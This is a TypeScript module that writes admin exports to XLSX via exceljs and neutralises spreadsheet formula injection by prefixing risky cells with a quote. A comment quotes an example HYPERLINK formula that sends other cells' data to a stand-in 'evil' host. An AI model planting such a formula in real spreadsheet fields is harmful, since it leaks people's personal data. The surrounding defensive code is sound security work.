// XLSX serialization for admin exports (P7) via exceljs. We chose exceljs over
// the `xlsx`/SheetJS package because SheetJS stopped publishing to npm — its
// newest npm build (0.18.5) carries a HIGH-severity advisory (prototype
// pollution / ReDoS), which P8's `npm audit` gate would flag. exceljs is
// maintained and audit-clean. The advisory class is parser-side anyway and we
// only ever WRITE workbooks (never parse untrusted uploads).
//
// Output: one worksheet per table. An optional `title` row (the event name) sits
// above a bold + frozen header row; columns are roughly auto-sized.

import ExcelJS from "exceljs";

// CSV/XLSX formula-injection defence (security audit M-finding). Cells come from
// untrusted public input (e.g. a participant's free-text fullName, the registrant
// email). exceljs writes them as text — not as <f> formulas — but Excel /
// LibreOffice / Google Sheets re-interpret a cell whose text STARTS with one of
// = + - @ (or a leading TAB/CR) as a live formula on open or on CSV re-export, so
// `=HYPERLINK("http://evil/?"&A1,"x")` smuggled into a name could exfiltrate the
// other (PII) cells when an admin opens the export. Prefix any such string with a
// single quote — the OWASP-recommended neutraliser — so it's forced to plain text.
// Applied at this serialization boundary so EVERY column (and any future one) is
// covered in one place. Numbers pass through untouched.
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
function neutralize(value: string | number): string | number {
  return typeof value === "string" && FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}

// One logical sheet: an optional title (event name), a header row, and data rows.
export type ExportTable = {
  sheetName: string;
  title?: string;
  headers: string[];
  rows: (string | number)[][];
};

function addSheet(wb: ExcelJS.Workbook, table: ExportTable): void {
  const ws = wb.addWorksheet(table.sheetName);

  let headerRowIdx = 1;
  if (table.title) {
    ws.addRow([neutralize(table.title)]);
    ws.getRow(1).font = { bold: true, size: 13 };
    headerRowIdx = 2;
  }

  ws.addRow(table.headers.map(neutralize));
  ws.getRow(headerRowIdx).font = { bold: true };
  ws.views = [{ state: "frozen", ySplit: headerRowIdx }];

  for (const row of table.rows) ws.addRow(row.map(neutralize));

  // Width ≈ longest cell in the column, clamped to a readable range.
  ws.columns.forEach((col, i) => {
    let max = (table.headers[i] ?? "").length;
    for (const row of table.rows) {
      const cell = row[i];
      const len = cell === undefined ? 0 : String(cell).length;
      if (len > max) max = len;
    }
    col.width = Math.min(45, Math.max(10, max + 2));
  });
}

// Accepts one table or several — each becomes its own worksheet, in order.
export async function toXlsx(tables: ExportTable | ExportTable[]): Promise<Buffer> {
  const wb = new ExcelJS.Workbook();
  for (const table of Array.isArray(tables) ? tables : [tables]) addSheet(wb, table);
  return Buffer.from(await wb.xlsx.writeBuffer());
}
